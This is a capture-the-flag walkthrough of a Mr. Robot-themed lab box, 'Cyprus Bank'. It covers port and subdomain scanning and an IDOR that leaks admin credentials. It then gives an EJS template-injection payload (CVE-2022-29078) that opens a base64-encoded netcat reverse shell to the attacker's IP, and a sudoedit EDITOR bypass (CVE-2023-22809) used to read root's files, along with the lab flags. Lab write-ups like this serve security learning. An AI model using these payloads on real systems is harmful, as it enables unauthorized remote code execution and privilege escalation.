# title :  WhiteroseCTF6

## overview 

```bash

This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

```

# walk through

- scan

```bash

$ nmap -sC -sV 10.10.81.213
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 18:26 WAT
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:35 (0:00:00 remaining)
Nmap scan report for 10.10.81.213
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 595.97 seconds


```

```bash

sudo echo "<targets ip>         cyprusbank.thm" >> /etc/hosts

```

- i run a subdomain scan 

```bash

ffuf -u http://cyprusbank.thm/  -H  "HOST: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 285ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 233ms]


```

- which i find two sub-domain i.e `admin` and `www`
- i add it to my `/etc/hosts`

- on the  `admin` subdomain i found login dashboard
- which i use the creditial that was provide to login

- after i login the permission wasn't suficient i.e it wasn't have permission to see the phone Number

- i saw a endpoint in the messages that allow modification of id, i.e `(idor)`

- and the message was 

```bash

Cyprus National Bank - Admin Chat

DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing

Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'

DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so

Gayle Bev: That's nice to hear!

Gayle Bev: Developers implemented this new messaging feature that I suggested! What you guys think?

Greger Ivayla: Looks really cool!

Jemmy Laurel: Hey have you guys seen Mrs. Jacobs recently??

Olivia Cortez: No she hasn't been around for a while

Jemmy Laurel: Oh, is she OK?


```

- which user `Gayle Bev` and it password was `p~]P@5!6;rs558:q`


## question  1 : What's Tyrell Wellick's phone number?

answer : `842-029-5701`




- it use ejs templete engine 

- make a research and i find an exploit on the template engine

 - EJS, Server side template injection RCE (CVE-2022–29078)

 ```bash

 name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4xMS4xMDguNzUgOTAwMSAtZSBzaA== | base64 -d | bash"');//

 ```

 - catch your shell with netcat

 ```bash

 nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.11.108.75] from (UNKNOWN) [10.10.81.213] 39182
id
uid=1001(web) gid=1001(web) groups=1001(web)

 ```

 - i use python to stablizer my shelll

 ```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

 ctrl + z

stty raw -echo && fg

 ```



 ```bash

 web@cyprusbank:~/app$ cd /

web@cyprusbank:/$ ls
bin   home            lib64       opt   sbin      sys  vmlinuz
boot  initrd.img      lost+found  proc  snap      tmp  vmlinuz.old
dev   initrd.img.old  media       root  srv       usr
etc   lib             mnt         run   swap.img  var

web@cyprusbank:/$ cd home

web@cyprusbank:/home$ ls
web
web@cyprusbank:/home$ cd web

web@cyprusbank:~$ ls
app  user.txt

web@cyprusbank:~$ cat user.txt
THM{4lways_upd4te_uR_d3p3nd3nc!3s}

 ```

 -  to get the root we have Escalate our Privilege

 ```bash 

web@cyprusbank:~$ sudo -l

Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm


 ```

 - After a short search, we find a bypass CVE-2023-22809 for sudoedit. This is applicable to sudo up to version 1.9.12p1. The vulnerability allows us to read and edit any files by specifying the EDITOR variable.

 ```bash

 web@cyprusbank:~$ sudoedit -V

Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
web@cyprusbank:~$ 


 ```

- the exploit was also useful for the exploit of the vulnerabilty

https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis



```bash

web@cyprusbank:~$ export EDITOR="vi -- /root/root.txt"

web@cyprusbank:~$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm



```


```bash

THM{5nd_uR_p4ck4g3s}
~                                                                               
~                                                                                                                     
"/var/tmp/rootqaoqYQ4n.txt" 1L, 21C                           1,5           All


```


